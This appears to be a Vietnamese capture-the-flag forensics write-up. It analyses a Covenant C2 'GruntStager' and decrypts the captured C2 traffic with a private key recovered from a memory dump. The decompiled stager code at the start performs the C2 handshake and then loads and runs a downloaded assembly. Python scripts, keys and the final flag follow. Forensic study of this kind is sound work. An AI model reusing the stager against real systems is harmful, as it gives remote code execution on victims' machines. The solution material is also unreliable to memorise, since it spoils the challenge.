                Aes aes = Aes.Create();
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.Key = key;
                aes.GenerateIV();
                HMACSHA256 hmacsha = new HMACSHA256(key);
                RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048, new CspParameters());
                byte[] bytes = Encoding.UTF8.GetBytes(rsacryptoServiceProvider.ToXmlString(false));
                byte[] array = aes.CreateEncryptor().TransformFinalBlock(bytes, 0, bytes.Length);
                byte[] inArray = hmacsha.ComputeHash(array);
                string s = string.Format(format3, new object[]
                {
                    str + text,
                    "0",
                    "",
                    Convert.ToBase64String(aes.IV),
                    Convert.ToBase64String(array),
                    Convert.ToBase64String(inArray)
                });
                ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls);
                ServicePointManager.ServerCertificateValidationCallback = delegate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
                {
                    bool flag = true;
                    if (UseCertPinning && CovenantCertHash != "")
                    {
                        flag = (cert.GetCertHashString() == CovenantCertHash);
                    }
                    if (flag & ValidateCert)
                    {
                        flag = (errors == SslPolicyErrors.None);
                    }
                    return flag;
                };
                string arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s));
                GruntStager.CookieWebClient cookieWebClient = null;
                cookieWebClient = new GruntStager.CookieWebClient();
                cookieWebClient.UseDefaultCredentials = true;
                cookieWebClient.Proxy = WebRequest.DefaultWebProxy;
                cookieWebClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                string text2 = "";
                foreach (string text3 in list)
                {
                    try
                    {
                        for (int i = 0; i < list3.Count; i++)
                        {
                            if (list2[i] == "Cookie")
                            {
                                cookieWebClient.SetCookies(new Uri(text3), list3[i].Replace(";", ",").Replace("{GUID}", ""));
                            }
                            else
                            {
                                cookieWebClient.Headers.Set(list2[i].Replace("{GUID}", ""), list3[i].Replace("{GUID}", ""));
                            }
                        }
                        cookieWebClient.DownloadString(text3 + list4[random.Next(list4.Count)].Replace("{GUID}", ""));
                        text2 = text3;
                    }
                    catch
                    {
                    }
                }
                for (int j = 0; j < list3.Count; j++)
                {
                    if (list2[j] == "Cookie")
                    {
                        cookieWebClient.SetCookies(new Uri(text2), list3[j].Replace(";", ",").Replace("{GUID}", text));
                    }
                    else
                    {
                        cookieWebClient.Headers.Set(list2[j].Replace("{GUID}", text), list3[j].Replace("{GUID}", text));
                    }
                }
                string text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
                text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
                List<string> list5 = GruntStager.Parse(text4, format3);
                string s2 = list5[3];
                string s3 = list5[4];
                string a = list5[5];
                byte[] array2 = Convert.FromBase64String(s3);
                if (!(a != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
                {
                    aes.IV = Convert.FromBase64String(s2);
                    byte[] rgb = aes.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length);
                    byte[] key2 = rsacryptoServiceProvider.Decrypt(rgb, true);
                    Aes aes2 = Aes.Create();
                    aes2.Mode = CipherMode.CBC;
                    aes2.Padding = PaddingMode.PKCS7;
                    aes2.Key = key2;
                    aes2.GenerateIV();
                    hmacsha = new HMACSHA256(aes2.Key);
                    byte[] array3 = new byte[4];
                    RandomNumberGenerator.Create().GetBytes(array3);
                    byte[] array4 = aes2.CreateEncryptor().TransformFinalBlock(array3, 0, array3.Length);
                    inArray = hmacsha.ComputeHash(array4);
                    string s4 = string.Format(format3, new object[]
                    {
                        text,
                        "1",
                        "",
                        Convert.ToBase64String(aes2.IV),
                        Convert.ToBase64String(array4),
                        Convert.ToBase64String(inArray)
                    });
                    arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s4));
                    for (int k = 0; k < list3.Count; k++)
                    {
                        if (list2[k] == "Cookie")
                        {
                            cookieWebClient.SetCookies(new Uri(text2), list3[k].Replace(";", ",").Replace("{GUID}", text));
                        }
                        else
                        {
                            cookieWebClient.Headers.Set(list2[k].Replace("{GUID}", text), list3[k].Replace("{GUID}", text));
                        }
                    }
                    text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
                    text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
                    List<string> list6 = GruntStager.Parse(text4, format3);
                    s2 = list6[3];
                    s3 = list6[4];
                    string a2 = list6[5];
                    array2 = Convert.FromBase64String(s3);
                    if (!(a2 != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
                    {
                        aes2.IV = Convert.FromBase64String(s2);
                        byte[] src = aes2.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length);
                        byte[] array5 = new byte[4];
                        byte[] array6 = new byte[4];
                        Buffer.BlockCopy(src, 0, array5, 0, 4);
                        Buffer.BlockCopy(src, 4, array6, 0, 4);
                        if (!(Convert.ToBase64String(array3) != Convert.ToBase64String(array5)))
                        {
                            aes2.GenerateIV();
                            byte[] array7 = aes2.CreateEncryptor().TransformFinalBlock(array6, 0, array6.Length);
                            inArray = hmacsha.ComputeHash(array7);
                            string s5 = string.Format(format3, new object[]
                            {
                                text,
                                "2",
                                "",
                                Convert.ToBase64String(aes2.IV),
                                Convert.ToBase64String(array7),
                                Convert.ToBase64String(inArray)
                            });
                            arg = GruntStager.MessageTransform.Transform(Encoding.UTF8.GetBytes(s5));
                            for (int l = 0; l < list3.Count; l++)
                            {
                                if (list2[l] == "Cookie")
                                {
                                    cookieWebClient.SetCookies(new Uri(text2), list3[l].Replace(";", ",").Replace("{GUID}", text));
                                }
                                else
                                {
                                    cookieWebClient.Headers.Set(list2[l].Replace("{GUID}", text), list3[l].Replace("{GUID}", text));
                                }
                            }
                            text4 = GruntStager.Parse(cookieWebClient.UploadString(text2 + list4[random.Next(list4.Count)].Replace("{GUID}", text), string.Format(format, arg)), format2)[0];
                            text4 = Encoding.UTF8.GetString(GruntStager.MessageTransform.Invert(text4));
                            List<string> list7 = GruntStager.Parse(text4, format3);
                            s2 = list7[3];
                            s3 = list7[4];
                            string a3 = list7[5];
                            array2 = Convert.FromBase64String(s3);
                            if (!(a3 != Convert.ToBase64String(hmacsha.ComputeHash(array2))))
                            {
                                aes2.IV = Convert.FromBase64String(s2);
                                Assembly.Load(aes2.CreateDecryptor().TransformFinalBlock(array2, 0, array2.Length)).GetTypes()[0].GetMethods()[0].Invoke(null, new object[]
                                {
                                    text2,
                                    CovenantCertHash,
                                    text,
                                    aes2
                                });
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine(ex.Message + Environment.NewLine + ex.StackTrace);
            }
        }

        // Token: 0x06000005 RID: 5 RVA: 0x00002A78 File Offset: 0x00000C78
        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}"))
            {
                format = format.Replace("{0}", "(?'group0'.*)");
            }
            if (format.Contains("{1}"))
            {
                format = format.Replace("{1}", "(?'group1'.*)");
            }
            if (format.Contains("{2}"))
            {
                format = format.Replace("{2}", "(?'group2'.*)");
            }
            if (format.Contains("{3}"))
            {
                format = format.Replace("{3}", "(?'group3'.*)");
            }
            if (format.Contains("{4}"))
            {
                format = format.Replace("{4}", "(?'group4'.*)");
            }
            if (format.Contains("{5}"))
            {
                format = format.Replace("{5}", "(?'group5'.*)");
            }
            Match match = new Regex(format).Match(data);
            List<string> list = new List<string>();
            if (match.Groups["group0"] != null)
            {
                list.Add(match.Groups["group0"].Value);
            }
            if (match.Groups["group1"] != null)
            {
                list.Add(match.Groups["group1"].Value);
            }
            if (match.Groups["group2"] != null)
            {
                list.Add(match.Groups["group2"].Value);
            }
            if (match.Groups["group3"] != null)
            {
                list.Add(match.Groups["group3"].Value);
            }
            if (match.Groups["group4"] != null)
            {
                list.Add(match.Groups["group4"].Value);
            }
            if (match.Groups["group5"] != null)
            {
                list.Add(match.Groups["group5"].Value);
            }
            return list;
        }

        // Token: 0x02000003 RID: 3
        public class CookieWebClient : WebClient
        {
            // Token: 0x17000001 RID: 1
            // (get) Token: 0x06000006 RID: 6 RVA: 0x00002C96 File Offset: 0x00000E96
            // (set) Token: 0x06000007 RID: 7 RVA: 0x00002C9E File Offset: 0x00000E9E
            public CookieContainer CookieContainer { get; private set; }

            // Token: 0x06000008 RID: 8 RVA: 0x00002CA7 File Offset: 0x00000EA7
            public CookieWebClient()
            {
                this.CookieContainer = new CookieContainer();
            }

            // Token: 0x06000009 RID: 9 RVA: 0x00002CBA File Offset: 0x00000EBA
            public void SetCookies(Uri uri, string cookies)
            {
                this.CookieContainer.SetCookies(uri, cookies);
            }

            // Token: 0x0600000A RID: 10 RVA: 0x00002CCC File Offset: 0x00000ECC
            protected override WebRequest GetWebRequest(Uri address)
            {
                HttpWebRequest httpWebRequest = base.GetWebRequest(address) as HttpWebRequest;
                if (httpWebRequest == null)
                {
                    return base.GetWebRequest(address);
                }
                httpWebRequest.CookieContainer = this.CookieContainer;
                return httpWebRequest;
            }
        }

        // Token: 0x02000004 RID: 4
        public static class MessageTransform
        {
            // Token: 0x0600000B RID: 11 RVA: 0x00002CFE File Offset: 0x00000EFE
            public static string Transform(byte[] bytes)
            {
                return Convert.ToBase64String(bytes);
            }

            // Token: 0x0600000C RID: 12 RVA: 0x00002D06 File Offset: 0x00000F06
            public static byte[] Invert(string str)
            {
                return Convert.FromBase64String(str);
            }
        }
    }
}
```
Đoạn mã nguồn này là một payload rất đặc trưng của Covenant C2 Framework. Trong Covenant, các payload được gọi là "Grunt", và đây chính xác là một GruntStager (Kịch bản khởi tạo kết nối ban đầu giữa máy nạn nhân và máy chủ C2). Thông tin Máy chủ C2 là IP/Port: 192.168.1.11:80, phương thức mã hóa là AES với key là :e+MPqFZXA52Kx1xuTPTK6M/HtJkjq/0dfBJUsSJfzQw=

Cơ chế bảo mật của Covenant như sau:

Giao tiếp ban đầu (Type 0): Payload tạo một cặp khóa RSA trên RAM. Nó gửi khóa Public RSA cho máy chủ C2 (được mã hóa bằng khóa AES cứng)

Trao đổi khóa (Key Exchange): Máy chủ C2 nhận được, tạo ra một Khóa phiên (Session Key) mới hoàn toàn ngẫu nhiên. C2 mã hóa Session Key này bằng Public RSA của nạn nhân và gửi lại.

Giao tiếp chính thức (Type 1 trở đi): Kể từ đây (chính là gói tin Type: 1 ), mọi giao tiếp đều được mã hóa bằng Session Key mới

Thứ chúng ta còn thiếu là cặp khóa public key và private key của thuật toán mã hóa RSA.

Luồng mã hóa tuân theo logic như này cho ta dễ hiểu: Các loại khóa (Key) tham gia vào hệ thống
Khóa tĩnh (Hardcoded AES Key): Cả máy nạn nhân (Grunt) và máy chủ C2 đều biết . Nhiệm vụ của nó chỉ là bảo vệ những lời chào hỏi đầu tiên.

Khóa bất đối xứng (RSA Keypair): Máy nạn nhân tự tạo ra khi vừa khởi động. Khóa Công khai (Public Key) dùng để đem đi tặng, còn Khóa Bí mật (Private Key) được giấu đi.

 Và cuối cùng là khóa phiên (Session Key): Máy chủ C2 tự tạo ra (chuỗi 64 ký tự Hex).

 Trích xuất RSA Private Key từ Memory Dump: Dùng HxD để trích private key từ file dmp, ctr+f để tìm với từ khóa là RSA2

 <img width="1023" height="560" alt="image" src="https://github.com/user-attachments/assets/ce43c9a2-48b9-4fe5-b0a0-8b99107e4434" />


<img width="1022" height="866" alt="image" src="https://github.com/user-attachments/assets/1499c9de-d3b2-444d-8f9d-1ad32ff77ccd" />

Tiến hành cắt bytes theo 3 khối là modules, P , Q

hex_n = "C214C87F9F0BB1E057909D7487EA07434B92006F4DD683A0430B6D1F1F5957F56EE1D845E6190AD0E745F2F5F6FD0BBA74D06D591478CB9C497BD1A976CC2E741FA54829444FD9C5140739D28F25E7BBFCA2BEF50FFAAF636CBE4858B27C32945AA70BF3A4095B4C38722A365DFBCAC93ED7F91488676E584FB285BEFD79D0AEB9B8047D24E64F1B2D92432FCB254ED381B822A728CE4264359BA34E1D2AE5454B2DF6673728327D0455C437179EDF994F4EFAF4F8426603F05764DAA55CEDD95F426BB7CFD6B8FD334B1B72264F0AABC32E930F0F7CA0295A660AF6DDEC393B800F113EDA2C6394ABC1414958605816E663C1F5682A9312860D9FB8C953B419"

hex_p = "D102B5556695AD6C37700711B9BE25305F2FD3B80D8B77C15F7853C5CE49536FA00F30AC3EB5F85BEBBBDA9688E292DCB1599E7F1196D7534512363675074882E9D6BF0097A38D13DABAB427AA10918E9CDFCD6065218A7F66132AE0D6E54BBCF3CE2BAB80313EBA0367E67C6EF28DFA538F03C5DE2E4FF1B08E119BED809EF7"

hex_q = "EDB6D5F91D36739999FADD1B1570A4A1CE23503A6B4217B82AC9C55E91DD78F4A85FBA5B848963AD6DE068D129DBC447398A46B0FC668314307687C1B66770CE000AEF3C6989A6B3379921A7F538691D219E50BBA87A72885271E72D7A744F8FEF8D073860E109728C02E6615B128036F6188A35D01A8AB71A4DFE7AED0AB16F"

Sau đó mình viết script để tính private key :
```
import base64

# --- 1. 3 CHUỖI HEX ĐÃ ĐƯỢC CẮT CHÍNH XÁC ---

hex_n = "C214C87F9F0BB1E057909D7487EA07434B92006F4DD683A0430B6D1F1F5957F56EE1D845E6190AD0E745F2F5F6FD0BBA74D06D591478CB9C497BD1A976CC2E741FA54829444FD9C5140739D28F25E7BBFCA2BEF50FFAAF636CBE4858B27C32945AA70BF3A4095B4C38722A365DFBCAC93ED7F91488676E584FB285BEFD79D0AEB9B8047D24E64F1B2D92432FCB254ED381B822A728CE4264359BA34E1D2AE5454B2DF6673728327D0455C437179EDF994F4EFAF4F8426603F05764DAA55CEDD95F426BB7CFD6B8FD334B1B72264F0AABC32E930F0F7CA0295A660AF6DDEC393B800F113EDA2C6394ABC1414958605816E663C1F5682A9312860D9FB8C953B419"

hex_p = "D102B5556695AD6C37700711B9BE25305F2FD3B80D8B77C15F7853C5CE49536FA00F30AC3EB5F85BEBBBDA9688E292DCB1599E7F1196D7534512363675074882E9D6BF0097A38D13DABAB427AA10918E9CDFCD6065218A7F66132AE0D6E54BBCF3CE2BAB80313EBA0367E67C6EF28DFA538F03C5DE2E4FF1B08E119BED809EF7"

hex_q = "EDB6D5F91D36739999FADD1B1570A4A1CE23503A6B4217B82AC9C55E91DD78F4A85FBA5B848963AD6DE068D129DBC447398A46B0FC668314307687C1B66770CE000AEF3C6989A6B3379921A7F538691D219E50BBA87A72885271E72D7A744F8FEF8D073860E109728C02E6615B128036F6188A35D01A8AB71A4DFE7AED0AB16F"

# Chuyển Hex thành số nguyên
n = int(hex_n.replace(" ", ""), 16)
p = int(hex_p.replace(" ", ""), 16)
q = int(hex_q.replace(" ", ""), 16)
e = 65537 # Số mũ mặc định của Windows

# --- 2. TỰ ĐỘNG TÍNH TOÁN CÁC THAM SỐ TOÁN HỌC ---
d = pow(e, -1, (p - 1) * (q - 1))
dmp1 = d % (p - 1)
dmq1 = d % (q - 1)
iqmp = pow(q, -1, p)

# --- 3. ĐÓNG GÓI CẤU TRÚC ASN.1 DER (Thủ công 100%) ---
def encode_int(val):
    h = hex(val)[2:]
    if len(h) % 2 != 0: h = '0' + h
    b = bytes.fromhex(h)
    if b[0] >= 0x80: b = b'\x00' + b # Bù số dương
    
    length = len(b)
    if length < 128:
        len_b = bytes([length])
    else:
        len_h = hex(length)[2:]
        if len(len_h) % 2 != 0: len_h = '0' + len_h
        len_b = bytes([0x80 | (len(len_h) // 2)]) + bytes.fromhex(len_h)
    return b'\x02' + len_b + b

def encode_seq(items):
    content = b''.join(items)
    length = len(content)
    if length < 128:
        len_b = bytes([length])
    else:
        len_h = hex(length)[2:]
        if len(len_h) % 2 != 0: len_h = '0' + len_h
        len_b = bytes([0x80 | (len(len_h) // 2)]) + bytes.fromhex(len_h)
    return b'\x30' + len_b + content

# Ghép toàn bộ tham số vào cấu trúc
der = encode_seq([
    encode_int(0), encode_int(n), encode_int(e), encode_int(d),
    encode_int(p), encode_int(q), encode_int(dmp1), encode_int(dmq1), encode_int(iqmp)
])

# --- 4. XUẤT RA CHUẨN PEM ---
b64 = base64.b64encode(der).decode('ascii')
pem = "-----BEGIN RSA PRIVATE KEY-----\n"
for i in range(0, len(b64), 64):
    pem += b64[i:i+64] + "\n"
pem += "-----END RSA PRIVATE KEY-----\n"

print(pem)
```

Thu được private key:
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwhTIf58LseBXkJ10h+oHQ0uSAG9N1oOgQwttHx9ZV/Vu4dhF
5hkK0OdF8vX2/Qu6dNBtWRR4y5xJe9GpdswudB+lSClET9nFFAc50o8l57v8or71
D/qvY2y+SFiyfDKUWqcL86QJW0w4cio2XfvKyT7X+RSIZ25YT7KFvv150K65uAR9
JOZPGy2SQy/LJU7TgbgipyjOQmQ1m6NOHSrlRUst9mc3KDJ9BFXENxee35lPTvr0
+EJmA/BXZNqlXO3ZX0Jrt8/WuP0zSxtyJk8Kq8Mukw8PfKApWmYK9t3sOTuADxE+
2ixjlKvBQUlYYFgW5mPB9WgqkxKGDZ+4yVO0GQIDAQABAoIBAD5VoIPk2EO8M0Oe
XsQcdVK23eDH3u8r/XgrHlQlpHNsv71H0kNx/ZhU/5FmUHq7nppQKx62RYnX234q
O8yNDcp8M4C2yFsBLZweKgMnuNvx89VtkZYdROGhFohz/HeJYz6ucldBc0Pgeiyo
xCdxbJMwXPuCDcFynmiShQRvswVD2aWL1F8n4m831ulcMwLdeyzY9zmfYcoVNw2e
I4Oy4i66zBNiB/9biXDm/ake1ELfuW3vYvx/SphqlR7ilJjeRIm2lYTxBV9koDfr
JKVLXC41U1tshUjZ/D5a3HcMVzbkYW4f14Y0TWMl3tqrhOBrHpU1mVf2zLmHM/la
EX942xUCgYEA0QK1VWaVrWw3cAcRub4lMF8v07gNi3fBX3hTxc5JU2+gDzCsPrX4
W+u72paI4pLcsVmefxGW11NFEjY2dQdIgunWvwCXo40T2rq0J6oQkY6c381gZSGK
f2YTKuDW5Uu8884rq4AxProDZ+Z8bvKN+lOPA8XeLk/xsI4Rm+2AnvcCgYEA7bbV
+R02c5mZ+t0bFXCkoc4jUDprQhe4KsnFXpHdePSoX7pbhIljrW3gaNEp28RHOYpG
sPxmgxQwdofBtmdwzgAK7zxpiaazN5khp/U4aR0hnlC7qHpyiFJx5y16dE+P740H
OGDhCXKMAuZhWxKANvYYijXQGoq3Gk3+eu0KsW8CgYBNi56xh7UCucK7urO14Tk1
ACvjdkb4Nr8055TVL9r+rMyKtjlBrwvtNsHksLMqtOhSmHh4lpMLYqaewiRkOQaL
I6z8AoFAOehi36BVkwBAsNO9KRqZit8yszFrWC4Ctp3tKtIC+DXNGwCGfPovw6gv
du75rGDpd9mo8pzP6EcvMwKBgQDF/UfAogUtSV0HpcseE2D7545gDxgwx0K8WKvL
9Z/KU7Q9byE0hZ4A4AhOJRBBG/zavwHb/Y2AVXt77dx5CTTaTwzMb7vTS4Xvo9p1
YvgmDH5otwNl8v6b7lcyXh2k7HOM6SB/Y6lrTf2xmKKz0Pf7TwPncaSvxqN1BEsV
pYMHfwKBgQCs6Vd/qxIVvjxQlD0weOfV1kisRS0329W+wsj2Msu50ZGkLXUZu7CW
ZiRah1qoJpooPdQGmOpW8QriZceSemddcAzDZx6u8jKSlenN9FE1BwlMXHf/WQlT
Sy/t+BECnNs1yxYXHFHfxq6yJR75yiD8Ksa0RiT8TjMMBRN8/8K0KA==
-----END RSA PRIVATE KEY-----
```
Giờ mình cần tìm session key, mình lại viết script với payload như này :

<img width="1917" height="440" alt="image" src="https://github.com/user-attachments/assets/a4d42c77-c56c-4018-8aa4-0d4009be4878" />

Đây là gói respone mà server c2 trả về máy nạn nhân tiến hành giải mã sẽ thu được session key từ đó giải mã được những luồng ở dưới packet, trước tiên giải mã b64 để lấy encrypt message trước:

<img width="1526" height="797" alt="image" src="https://github.com/user-attachments/assets/ac8c9e00-ceb8-45b7-b8e7-ed3755a0bcb4" />

Script giải mã lấy session key:

```
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization

# 1. THÔNG SỐ ĐẦU VÀO
aes_key_b64 = "e+MPqFZXA52Kx1xuTPTK6M/HtJkjq/0dfBJUsSJfzQw="
iv_b64 = "7/1U1Qfc69DJkFQMuC7YLg=="
enc_message_b64 = "8AVdSUo020zmBvJqdpXDEA9sRyotMGyUVqXOrRFk95GxGDEYotveTpqJhHUKUQ3Oduh3c7gSyyM3qVVN674P+ghJNQcdJdRS1YlUJckbg/bOEkfuxJ25JWMPh21EPS0/ptf6ytfkhnXjVJ4v3miEtdZ/+vtP4L49V8Ucl7kej8DrPfux1wi4oGjIf4TdRb2OYLQExVbcMGLb8b73mjmGwWTywqDc5+mr/m80cyv2xVQHLpQIiw1xdjFCgIH3J2FZDQMm14gr4caODgmGT+JGoOCGl8pMEPJ6q58Cv5LHTNLl/k3vtufVv8vIzn8FXHoAy+2ZHJ1vZXIqUl+OubCv2VhhSmCXz6Fg/G4AqFWb+cA="

pem_data = b"""-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwhTIf58LseBXkJ10h+oHQ0uSAG9N1oOgQwttHx9ZV/Vu4dhF
5hkK0OdF8vX2/Qu6dNBtWRR4y5xJe9GpdswudB+lSClET9nFFAc50o8l57v8or71
D/qvY2y+SFiyfDKUWqcL86QJW0w4cio2XfvKyT7X+RSIZ25YT7KFvv150K65uAR9
JOZPGy2SQy/LJU7TgbgipyjOQmQ1m6NOHSrlRUst9mc3KDJ9BFXENxee35lPTvr0
+EJmA/BXZNqlXO3ZX0Jrt8/WuP0zSxtyJk8Kq8Mukw8PfKApWmYK9t3sOTuADxE+
2ixjlKvBQUlYYFgW5mPB9WgqkxKGDZ+4yVO0GQIDAQABAoIBAD5VoIPk2EO8M0Oe
XsQcdVK23eDH3u8r/XgrHlQlpHNsv71H0kNx/ZhU/5FmUHq7nppQKx62RYnX234q
O8yNDcp8M4C2yFsBLZweKgMnuNvx89VtkZYdROGhFohz/HeJYz6ucldBc0Pgeiyo
xCdxbJMwXPuCDcFynmiShQRvswVD2aWL1F8n4m831ulcMwLdeyzY9zmfYcoVNw2e
I4Oy4i66zBNiB/9biXDm/ake1ELfuW3vYvx/SphqlR7ilJjeRIm2lYTxBV9koDfr
JKVLXC41U1tshUjZ/D5a3HcMVzbkYW4f14Y0TWMl3tqrhOBrHpU1mVf2zLmHM/la
EX942xUCgYEA0QK1VWaVrWw3cAcRub4lMF8v07gNi3fBX3hTxc5JU2+gDzCsPrX4
W+u72paI4pLcsVmefxGW11NFEjY2dQdIgunWvwCXo40T2rq0J6oQkY6c381gZSGK
f2YTKuDW5Uu8884rq4AxProDZ+Z8bvKN+lOPA8XeLk/xsI4Rm+2AnvcCgYEA7bbV
+R02c5mZ+t0bFXCkoc4jUDprQhe4KsnFXpHdePSoX7pbhIljrW3gaNEp28RHOYpG
sPxmgxQwdofBtmdwzgAK7zxpiaazN5khp/U4aR0hnlC7qHpyiFJx5y16dE+P740H
OGDhCXKMAuZhWxKANvYYijXQGoq3Gk3+eu0KsW8CgYBNi56xh7UCucK7urO14Tk1
ACvjdkb4Nr8055TVL9r+rMyKtjlBrwvtNsHksLMqtOhSmHh4lpMLYqaewiRkOQaL
I6z8AoFAOehi36BVkwBAsNO9KRqZit8yszFrWC4Ctp3tKtIC+DXNGwCGfPovw6gv
du75rGDpd9mo8pzP6EcvMwKBgQDF/UfAogUtSV0HpcseE2D7545gDxgwx0K8WKvL
9Z/KU7Q9byE0hZ4A4AhOJRBBG/zavwHb/Y2AVXt77dx5CTTaTwzMb7vTS4Xvo9p1
YvgmDH5otwNl8v6b7lcyXh2k7HOM6SB/Y6lrTf2xmKKz0Pf7TwPncaSvxqN1BEsV
pYMHfwKBgQCs6Vd/qxIVvjxQlD0weOfV1kisRS0329W+wsj2Msu50ZGkLXUZu7CW
ZiRah1qoJpooPdQGmOpW8QriZceSemddcAzDZx6u8jKSlenN9FE1BwlMXHf/WQlT
Sy/t+BECnNs1yxYXHFHfxq6yJR75yiD8Ksa0RiT8TjMMBRN8/8K0KA==
-----END RSA PRIVATE KEY-----"""

try:
    # 2. GIẢI MÃ LỚP NGOÀI (AES-CBC)
    key = base64.b64decode(aes_key_b64)
    iv = base64.b64decode(iv_b64)
    enc_data = base64.b64decode(enc_message_b64)

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    padded_rsa_cipher = decryptor.update(enc_data) + decryptor.finalize()

    # Xóa đệm PKCS7 của AES
    unpadder = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
    rsa_cipher = unpadder.update(padded_rsa_cipher) + unpadder.finalize()

    # 3. GIẢI MÃ LỚP LÕI (RSA-OAEP)
    private_key = serialization.load_pem_private_key(pem_data, password=None)
    
    session_key = private_key.decrypt(
        rsa_cipher,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA1()),
            algorithm=hashes.SHA1(),
            label=None
        )
    )

    # 4. XUẤT KẾT QUẢ
    print("\n[+] THÀNH CÔNG! ĐÂY LÀ SESSION KEY CỦA BẠN:")
    print(session_key.hex())

except Exception as e:
    print(f"\n[-] Có lỗi xảy ra: {e}")
```
Thu được kết quả như sau :

<img width="1482" height="576" alt="image" src="https://github.com/user-attachments/assets/5060b602-40f9-44a3-af79-4e316e47388b" />

Đã có session key giờ ta tiếp tục giải mã các payload để xem mã độc này đã làm gì trên máy nạn nhân với các luồng màu đỏ:

<img width="1915" height="872" alt="image" src="https://github.com/user-attachments/assets/565bd9ff-1a54-4372-96dc-bed38144230a" />

Mình chỉ ví dụ 1 vài luồng ở gần cuối :
<img width="1540" height="706" alt="image" src="https://github.com/user-attachments/assets/5f612787-ab7a-4b37-88be-7c6bde66df66" />

Tiến hành giải mã có vẻ như attacker đã cài keylogger vào máy nạn nhân:

<img width="1562" height="817" alt="image" src="https://github.com/user-attachments/assets/aa8a7560-04be-4ce7-bcac-a03f7c47a4d3" />

<img width="1887" height="967" alt="image" src="https://github.com/user-attachments/assets/b0b57a43-2bcd-43d0-bad5-aa5365726a37" />

 Tiến hành giải mã luồng này mình thu được flag:

<img width="1545" height="737" alt="image" src="https://github.com/user-attachments/assets/22c40008-cf29-4235-91c0-bb077fc585b1" />

<img width="1515" height="722" alt="image" src="https://github.com/user-attachments/assets/2df120a4-f16b-4298-973d-4f87357fce8f" />

Flag: HTB{C2slshiftkeyLSHIFTKEYLSHIFTKEYLSHIFTKEYLSHIFTKEYLSHIFTKEY"}


 












